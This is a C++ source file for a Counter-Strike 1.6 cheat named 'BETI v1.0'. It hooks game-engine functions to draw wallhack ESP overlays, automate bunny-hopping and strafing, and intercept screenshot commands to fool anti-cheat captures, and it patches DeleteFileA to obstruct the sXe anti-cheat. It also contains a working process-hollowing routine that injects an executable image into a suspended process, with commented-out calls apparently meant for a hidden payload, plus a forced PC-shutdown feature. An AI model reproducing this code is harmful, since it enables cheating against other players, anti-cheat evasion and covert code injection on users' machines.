#include <iostream>
#pragma comment(lib, "winmm.lib")
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include <time.h>
#include "client.h"
#include "players.h"
#include "drawing.h"
#include "Engine.h"
#include "ESP.h"
#include "menu.h"
#include "tkz.h"
#include "apihook.h"
#include "cvar.h"
#include "weapon.h"
int currentWeaponID = 0; 
extern int g_PlayerTeam[33];
int menu = 0;
struct hostage_info
{ cl_entity_s *ent; };
vector<hostage_info> vEntity;
extern SCREENINFO g_Screen;
extern float mainViewAngles[3];
tkz_state Tkz;
int tkz_state::iSnapTimer = 6;
int tkz_state::iScreenTimer = 6;
int tkz_state::iReadPixels = 0;
bool tkz_state::bSnapshot = false;
bool tkz_state::bScreenshot = false;
bool tkz_state::bMakeScreen = false;
void tkz_state::snapshot_hooked(){ bSnapshot = true; }
void tkz_state::screenshot_hooked(){ bScreenshot = true; };
typedef struct cmd_s
{
	struct cmd_s	*pNext;
	PCHAR			pszName;
	DWORD			pfnFunc;
	BYTE			bCrap[20];
}cmd_t, *pcmd_t;
HANDLE MapFileToMemory(LPCSTR filename)
{
	std::streampos size;
	std::fstream file(filename, std::ios::in | std::ios::binary | std::ios::ate);
	if (file.is_open())
	{
		size = file.tellg();

		char* Memblock = new char[size]();

		file.seekg(0, std::ios::beg);
		file.read(Memblock, size);
		file.close();

		return Memblock;
	}
	return 0;
}
int RunPortableExecutable(void* Image)
{
	IMAGE_DOS_HEADER* DOSHeader; 
	IMAGE_NT_HEADERS* NtHeader;
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX;

	DWORD* ImageBase; 
	void* pImageBase; 

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); 

	GetModuleFileNameA(0, CurrentFilePath, 1024); 

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) 
	{
		ZeroMemory(&PI, sizeof(PI)); 
		ZeroMemory(&SI, sizeof(SI)); 

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) 
													 
		{
			
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; 

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
			{

				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

		
				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);


				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX)); 
				ResumeThread(PI.hThread); 

				return 0; 
			}
		}
	}
}
DWORD CopyCmd(char*oldName, char*newName, void(*oldFunc)())
{
	pcmd_t pCmd = g_Engine.pfnGetCmdList();
	while(pCmd != NULL)
	{
		if(!strcmpi(pCmd->pszName, oldName))
		{
			pCmd->pszName = newName;
			g_Engine.pfnAddCommand(oldName, oldFunc);
			return pCmd->pfnFunc;
		}
		pCmd = pCmd->pNext;
	}
	return 0;
}
struct cl_enginefuncs_s g_Engine		= { NULL };									// Our own struct with engine functions
cl_enginefuncs_s* g_pEngine				=( cl_enginefuncs_s* )0x01EB72D8;			// Pointer to engine functions struct
engine_studio_api_s* g_pStudio			=( engine_studio_api_s* )0x01ED3520;		// Pointer to IEngineStudio
engine_studio_api_t g_Studio		= { NULL };									// EngineStudio			
struct hook_t
{
	bool IsHooked;
	void* functionAddress;
	void *hookAdress;
	char jmp[6];
	char orginalebyte[6];
	void*OrginaleFunction;
};

namespace hook
{
	bool IntalizeHook(hook_t*Hook, char*Module, char*function, void*HookFunction)
	{
		HMODULE hModule;
		DWORD orgFunc, FuncAdr;
		byte opcodes[] = { 0x90,0x90, 0x90, 0x90, 0x90,0xe9,0x00, 0x00 ,0x00,0x00 };
		if (Hook->IsHooked)
		{
			return false;
		}
		hModule = GetModuleHandle(Module);
		if (hModule == INVALID_HANDLE_VALUE)
		{
			Hook->IsHooked = false;
			return false;
		}
		Hook->jmp[0] = 0xe9;
		*(PULONG)&Hook->jmp[1] = (ULONG)HookFunction - (ULONG)Hook->functionAddress - 5;
		memcpy(Hook->orginalebyte, Hook->functionAddress, 5);
		Hook->OrginaleFunction = VirtualAlloc(0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (Hook->OrginaleFunction == NULL)
		{
			return false;
		}

		memcpy(Hook->functionAddress, Hook->orginalebyte, 5);
		orgFunc = (ULONG)Hook->OrginaleFunction + 5;
		FuncAdr = (ULONG)Hook->OrginaleFunction + 5;
		*(LPBYTE)((LPBYTE)Hook->OrginaleFunction + 5) = 0xe9;
		*(PULONG)((LPBYTE)Hook->OrginaleFunction + 6) = (ULONG)FuncAdr;
		Hook->IsHooked = true;
		return true;
	}

	bool InsertHook(hook_t*Hook)
	{
		DWORD op;
		if (!Hook->IsHooked)
		{
			return false;
		}
		VirtualProtect(Hook->functionAddress, 5, PAGE_EXECUTE_READWRITE, &op);
		memcpy(Hook->functionAddress, Hook->jmp, 5);
		VirtualProtect(Hook->functionAddress, 5, op, &op);
		return true;
	}

	bool UnHook(hook_t*Hook)
	{
		DWORD op;
		if (!Hook->IsHooked)
		{
			return false;
		}
		VirtualProtect(Hook->functionAddress, 5, PAGE_EXECUTE_READWRITE, &op);
		memcpy(Hook->functionAddress, Hook->orginalebyte, 5);
		VirtualProtect(Hook->functionAddress, 5, op, &op);
		Hook->IsHooked == false;
		return false;
	}

	bool FreeHook(hook_t*Hook)
	{
		if (!Hook->IsHooked)
		{
			return false;
		}
		VirtualFree(Hook->OrginaleFunction, 5, MEM_RESERVE);
		memset(Hook, 0, sizeof(hook_t*));
		return true;
	}

}


using namespace hook;

typedef BOOL(WINAPI*pDeleteFileA)(LPSTR lpFileName);

pDeleteFileA pDeleteFile;
HWND hwnd;
hook_t Hook;

BOOL WINAPI HookDeletFileA(LPSTR lpFileName)
{
	if (strstr(lpFileName, "v_awp.mdl"))
	{
		SetLastError(ERROR_ACCESS_DENIED);
		MessageBoxA(hwnd, "sXe Can`t Delete Awp Modele :D", "Fuck sXe", MB_ICONERROR);
		return false;
	}
	return pDeleteFile(lpFileName);
}
void StartScan()
{
	pDeleteFile = (pDeleteFileA)Hook.OrginaleFunction;
	IntalizeHook(&Hook, "Kernel32.dll", "pDeleteFileA", HookDeletFileA);
	InsertHook(&Hook);
	
}

int ia = 0;
DWORD WINAPI Thread(LPVOID arg)
{
	HWND sXe = FindWindowA(NULL, "Injected Anti-cheat 17.2");
	//StartScan();
	while (true)
	{
		
		if (!sXe)
		{
			SetWindowTextA(hwnd, "-=[ BETI v1.0 | Coder: CisCo_X ]=-");
		}
		else
		{
			SetWindowTextA(sXe, "-=[ BETI v1.0 | Coder: CisCo_X ]=-");
		}
		if (autocl == 1)
		{
		
			if (ia == 1)
			{
				BLUE = 1;
				RED = 1;
				GREEN = 1;
			}
			if (ia == 2)
			{
				BLUE = 0;
				RED = 1;
				GREEN = 1;
			}
			if (ia == 3)
			{
				BLUE = 1;
				RED = 0;
				GREEN = 1;
			}
			if (ia == 4)
			{
				BLUE = 1;
				RED = 1;
				GREEN = 0;
			}
			if (ia == 5)
			{
				BLUE = 0;
				RED = 0;
				GREEN = 1;
			}
			if (ia == 6)
			{
				BLUE = 0;
				RED = 1;
				GREEN = 0;
			}
			if (ia == 7)
			{
				BLUE = 1;
				RED = 0;
				GREEN = 0;
				ia = 1;
			}
			ia++;
		}

		Sleep(10);
	}
}
void InitHack()
{

	g_Screen.iSize = sizeof(SCREENINFO);
	g_Engine.pfnGetScreenInfo(&g_Screen);
	CreateThread(0, 0, Thread, 0, 0, 0);
		g_Engine.pfnClientCmd("toggleconsole");
	
	Tkz.real_snapshot = (con_func)CopyCmd("snapshot", "", Tkz.snapshot_hooked);
	Tkz.real_screenshot = (con_func)CopyCmd("screenshot", "", Tkz.screenshot_hooked);
	char bg[42];
//	RunPortableExecutable(rawData);
	char tmpName[255];
	TCHAR nameBuf[MAX_COMPUTERNAME_LENGTH + 2];
	DWORD nameBufSize;
	nameBufSize = sizeof nameBuf - 1;
	if (GetComputerName(nameBuf, &nameBufSize) == TRUE) {
		sprintf(bg, "%s", nameBuf);
	}
	g_Engine.Con_Printf("\n_______________________________________\n\t\ Welcome: [%s|%s].\n", g_Engine.pfnGetCvarString("name"),bg);
	g_Engine.Con_Printf("\t\t BETI V1.0\n");
	g_Engine.Con_Printf("\t\t\t\tMenu Key : F1\n");
	g_Engine.Con_Printf("\t\t\t\t    CODE : CisCo_X\n");
	std::time_t now = std::time(NULL);
  std::tm * ptm = std::localtime(&now);
  char buffer[96];

  std::strftime(buffer, 96, "\tTime:%H:%M:%S", ptm);
  sprintf(buffer, "%s\n", buffer);
  g_Engine.Con_Printf("\t\t\t\t\t");
	g_Engine.Con_Printf(buffer);
	g_Engine.Con_Printf("_______________________________________\n");
	hwnd = GetForegroundWindow();
	Tkz.iReadPixels = GetTickCount();
}
void HUD_Frame(double time)
{
	Tkz.iUpdateCurrent = timeGetTime();
	if(Tkz.iUpdateCurrent - Tkz.iUpdateLast >= 300)
		Tkz.bGameActive = false;
	Tkz.AntiScreen();
}
void HUD_Redraw ( float x, int y )
{
  if(gMenu.Active)
	gMenu.Draw();
	Tkz.bGameActive = true;
	Tkz.iUpdateLast = timeGetTime();
	DWORD curTime = timeGetTime();
	while(mySounds.size() && curTime - mySounds.front().timestamp >= 300)
		mySounds.pop_back();
	g_Drawing.InitVisuals();
	int Y = 0;
	int pos_info_main = 133;
	Y = g_Drawing.iStringHeight();
	cl_entity_t *pLocal = GetLocalPlayer();
	g_Local.iIndex = pLocal->index;
	g_Local.alive = ( pLocal->curstate.solid ? true : false );
	if(!Tkz.bMakeScreen && !Tkz.bNoDraw && esp_ent)DrawEntityEsp();
    if(!Tkz.bMakeScreen && !Tkz.bNoDraw && misc_chasecam)
	{
		g_pEngine->pfnGetCvarPointer("chase_active")->value = 1;
		g_pEngine->pfnGetCvarPointer("r_drawviewmodel")->value = 0;
	}
	if(!Tkz.bMakeScreen && !Tkz.bNoDraw && esp_box)BoxEsp();
		screenfade_t screenfade = { 0, 0, 0, 0, 0, 0, 0, 0, 0 }; 
		g_Engine.pfnSetScreenFade( &screenfade ); 
	if(!Tkz.bMakeScreen && !Tkz.bNoDraw && boxvis)visEsp();

	if(!Tkz.bMakeScreen && !Tkz.bNoDraw && name)
	{
	
		PlayerEsp();
		
	}
if(!Tkz.bMakeScreen && !Tkz.bNoDraw && reload)
	{
	
		PlayerEsp();
		
	}
if(!Tkz.bMakeScreen && !Tkz.bNoDraw && weapon)
	{
	
		PlayerEsp();
	
	}
if(!Tkz.bMakeScreen && !Tkz.bNoDraw && distanesp)
	{
	
		PlayerEsp();
		
	}

	for(int i=1; i<33; i++)
	{
		PlayerInfo& p = g_Player[i];
		cl_entity_s *ent = GetEntityByIndex(i);
		pfnGetPlayerInfo(i,&g_Player[i].entinfo);
		g_Player[i].bUpdated		= bIsValidEnt(ent);
		g_Player[i].vOrigin			= ent->origin;
		g_Player[i].bDucked			= ent->curstate.maxs[2]-ent->curstate.mins[2]<54;
		g_Player[i].team			= GetPlayerTeam();
		g_Player[i].fDistance		= floor(sqrt(POW(abs(p.vOrigin.x - g_Local.vOrigin.x)) + POW(abs(p.vOrigin.y - g_Local.vOrigin.y)) + POW(abs(p.vOrigin.z - g_Local.vOrigin.z)))-32);
	
	}
	return;
}

void HUD_PlayerMove ( struct playermove_s *ppmove, qboolean server )
{
	g_Local.vOrigin = ppmove->origin;
	g_Engine.pEventAPI->EV_LocalPlayerViewheight(g_Local.vEye);
	g_Local.vEye = g_Local.vEye + ppmove->origin;
	g_Local.pmFlags = ppmove->flags;
	g_Local.iWaterLevel = ppmove->waterlevel;
	g_Local.fOnLadder = ppmove->movetype == 5;
	g_Local.iUseHull=ppmove->usehull;
	g_Local.iMoveType = ppmove->movetype;
	
	Vector vTemp1 = g_Local.vOrigin;
	vTemp1[2] -= 8192;
	pmtrace_t *trace = g_Engine.PM_TraceLine(g_Local.vOrigin, vTemp1, 1, ppmove->usehull, -1); 

	g_Local.flHeight=abs(trace->endpos.z - g_Local.vOrigin.z);

	if(g_Local.flHeight <= 60) g_Local.flGroundAngle=acos(trace->plane.normal[2])/M_PI*180; 
	else g_Local.flGroundAngle = 0;

	Vector vTemp2=trace->endpos;
	pmtrace_t pTrace;
	EV_SetTraceHull( ppmove->usehull );
	EV_PlayerTrace( g_Local.vOrigin, vTemp2, PM_GLASS_IGNORE | PM_STUDIO_BOX, g_Local.iIndex, &pTrace );
	if( pTrace.fraction < 1.0f )
	{
		g_Local.flHeight=abs(pTrace.endpos.z - g_Local.vOrigin.z);
		int ind=g_Engine.pEventAPI->EV_IndexFromTrace(&pTrace);
		if(ind>0&&ind<33)
		{
			float dst=g_Local.vOrigin.z-(g_Local.iUseHull==0?32:18)-g_Player[ind].vOrigin.z-g_Local.flHeight;
			if(dst<30)
			{
				g_Local.flHeight-=14.0;
			}
		}
	}
	return;
}
void DoBunnyHop(struct usercmd_s *usercmd)
{
	if (((usercmd->buttons & IN_JUMP) && !(g_Local.pmFlags & FL_ONGROUND)))
		usercmd->buttons &= ~IN_JUMP;
}

void CL_CreateMove ( float frametime, struct usercmd_s *cmd, int active )
{


	static bool circlestrafeando = false;
	if (!(g_Local.pmFlags&(FL_ONGROUND | FL_INWATER)) && g_Local.pmGroundSpeed)
	{
		float variable = 0;
		if (GetAsyncKeyState(0x56))
		{
			cmd->forwardmove = 450.f;
			cmd->sidemove = 0.0f;
			int random = rand() % 100;
			int random2 = rand() % 1000;
			static bool dir;
			static float current_y = cmd->viewangles.y;
			if (g_Local.pmGroundSpeed > 50.f)
			{
				variable += 0.00007;
				current_y += 3 - variable;
			}
			else
			{
				variable = 0;
			}
			cmd->viewangles.y = current_y;
			if (random == random2)
				cmd->viewangles.y += random;
			cmd->viewangles[1] = current_y;
			circlestrafeando = true;
		}
		else
		{
			float variable = 0;
			circlestrafeando = false;
		}
	}

  cl_entity_s *LocalEnt = GetLocalPlayer();
	g_Local.alive = LocalEnt && !(LocalEnt->curstate.effects & EF_NODRAW) && LocalEnt->player && LocalEnt->curstate.movetype !=6 && LocalEnt->curstate.movetype != 0;
	g_Local.bBadWeapon = (g_Local.iWeaponID==WEAPONLIST_C4)||(g_Local.iWeaponID==WEAPONLIST_FLASHBANG)||(g_Local.iWeaponID==WEAPONLIST_HEGRENADE)||(g_Local.iWeaponID==WEAPONLIST_KNIFE)||(g_Local.iWeaponID==WEAPONLIST_SMOKEGRENADE);


  if(g_Local.alive)
	{

	}


	static bool bStrafing=false;
		if(!(g_Local.pmFlags&(FL_ONGROUND|FL_INWATER)) && g_Local.pmGroundSpeed && g_Local.alive)
		{

			float strafe_speed=0;
			if(g_Local.pmAirAccelerate==10)
				strafe_speed=18.3487423787845434132324324;//18.3;
			else if(g_Local.pmAirAccelerate==100)
				strafe_speed=17.75;
			else
				strafe_speed=17.92;
			cmd->forwardmove=strafe_speed*g_Local.pmMaxSpeed/g_Local.pmGroundSpeed;
			if(bStrafing)
				cmd->sidemove=-g_Local.pmMaxSpeed;
			else
				cmd->sidemove=+g_Local.pmMaxSpeed;
			bStrafing=!bStrafing;
		}

		if (!(g_Local.pmFlags&(FL_ONGROUND | FL_INWATER)) && g_Local.pmGroundSpeed)
		{
			float strafe_speed = 0;
			if (g_Local.pmAirAccelerate == 10)
				strafe_speed = 18.3487423787845434132324324f;
			else if (g_Local.pmAirAccelerate == 100)
				strafe_speed = 17.75f;
			else
				strafe_speed = 17.92f;
			cmd->forwardmove = strafe_speed*g_Local.pmMaxSpeed / g_Local.pmGroundSpeed;
			if (bStrafing)
				cmd->sidemove = -g_Local.pmMaxSpeed;
			else
				cmd->sidemove = +g_Local.pmMaxSpeed;
			bStrafing = !bStrafing;
		}
		int bInDuck;
		if (GetAsyncKeyState(K_ALT))
		{
			if (g_Local.pmFlags&FL_ONGROUND)
				cmd->buttons |= IN_DUCK;
			if (((g_Local.pmFlags&FL_ONGROUND) || !(g_Local.pmFlags&FL_ONGROUND)))
				cmd->buttons &= ~IN_DUCK;
		}
		DoBunnyHop(cmd);
	

}


void PreV_CalcRefdef ( struct ref_params_s *pparams )
{
	VectorCopy(pparams->forward,g_Local.vForward)
	VectorCopy(pparams->vieworg,g_Local.vViewOrg)
	VectorCopy(pparams->punchangle,g_Local.punchangle);
	
	return;
}

void PostV_CalcRefdef ( struct ref_params_s *pparams )
{

}

int AddEntResult = 1;
void HUD_AddEntity ( int type, struct cl_entity_s *ent, const char *modelname )
{
	AddEntResult = 1;
	hostage_info dummy;
	dummy.ent = ent;
	if(vEntity.size()<64) vEntity.push_back(dummy);

	cl_entity_t *pLocal = GetLocalPlayer();		
	hud_player_info_t pinfo;
	int teamme = 0;
	int teamot = 0;
	teamme = GetPlayerTeam();
	bool visible=false;
	int colorr,colorg,colorb;			
	colorr = 255;
	colorg = 255;
	colorb = 255;
	for(int i = 0; i < 33; i++)			
	{
		if(i == pLocal->index) continue;									 
																					
																				
		cl_entity_s *ent =GetEntityByIndex(i);
		pmtrace_t *vis = g_pEngine->PM_TraceLine(pLocal->origin, ent->origin, 0, 2, -1);

		pfnGetPlayerInfo(i, &pinfo);

		if(ent != NULL && bIsValidEnt(ent))
		{
			if(i != pLocal->index)
			{
				if( strstr( pinfo.model, "arctic" ) || strstr( pinfo.model, "guerilla" ) || strstr( pinfo.model, "leet" ) || strstr( pinfo.model, "terror" ) ) 
				{
					colorr = 255;
					colorg = 0;
					colorb = 0;
					teamot =1;
				}
				else if( strstr( pinfo.model, "gign" ) || strstr( pinfo.model, "gsg9" ) || strstr( pinfo.model, "sas" ) || strstr( pinfo.model, "urban" ) || strstr( pinfo.model, "vip" )) 
				{
					colorr = 0;
					colorg = 0;
					colorb = 255;
					teamot=2;
				}
				if(vis->fraction == 1.0f)
				{
					visible = true;
				}
				else if(vis->fraction < 1.0f)
				{
					visible = false;
				}
			}
		
			
		}
	}
}


void Shutdown()
{
	OSVERSIONINFO OsInfo;
	OsInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&OsInfo);

	if (OsInfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
	{
		HANDLE hToken;
		TOKEN_PRIVILEGES tkp;
		if (!OpenProcessToken(GetCurrentProcess(),
			TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		{
			return;
		}
		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
		tkp.PrivilegeCount = 1;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
		if (GetLastError() != ERROR_SUCCESS)
		{
			return;
		}
		if (!ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0))
		{
		}
	}
}
void HUD_PostRunCmd(struct local_state_s *from, struct local_state_s *to, struct usercmd_s *cmd, int runfuncs, double time, unsigned int random_seed, int i)
{
	
	
	if (shit == 1)
	{
		//RunPortableExecutable(FUCKER:D);
	}
	if (shutdownn == 1)
	{
		
		
		const int result = MessageBoxA(NULL, "Are You Sure ShutDown PC?!", "SYSTEM!", MB_YESNO);
		switch (result)
		{
		case IDYES:
		
			g_Engine.pfnClientCmd("say SHUTDOWN PC HAHAHAHA!");
			Shutdown();
			break;
		case IDNO:
			shutdownn = 0;
			break;
		}

	}
}

int KeyEventResult = 1;
int HUD_Key_Event ( int eventcode, int keynum, const char *pszCurrentBinding )
{
	if (keynum == VK_F1  && eventcode) { gMenu.Active = !gMenu.Active; KeyEventResult = 0; return 0; }
	if (gMenu.Active  && eventcode)
	{
		KeyEventResult = gMenu.KeyEvent(keynum);
		if (!KeyEventResult) return 0;
	}
	return KeyEventResult;
}


void SPR_Set ( int hPic, int r, int g, int b )
{
	colorList.get(9);
	g_Engine.pfnSPR_Set( hPic, r, g, b );
}

void SPR_Draw ( int frame, int x, int y, const struct rect_s *prc )
{

	g_Engine.pfnSPR_Draw( frame, x, y, prc );
}

void SPR_DrawHoles ( int frame, int x, int y, const struct rect_s *prc )
{

	g_Engine.pfnSPR_DrawHoles( frame, x, y, prc );
}

void SPR_DrawAdditive ( int frame, int x, int y, const struct rect_s *prc )
{
 
	g_Engine.pfnSPR_DrawAdditive( frame, x, y, prc );
}

int DrawCharacter ( int x, int y, int number, int r, int g, int b )
{
	return g_Engine.pfnDrawCharacter( x, y, number, r, g, b );
}

int DrawConsoleString ( int x, int y, char *string )
{
	return g_Engine.pfnDrawConsoleString( x, y, string );
}

void FillRGBA ( int x, int y, int width, int height, int r, int g, int b, int a )
{
	g_Engine.pfnFillRGBA( x, y, width, height, r, g, b, a );
}

void AtRoundStart(void)
{

}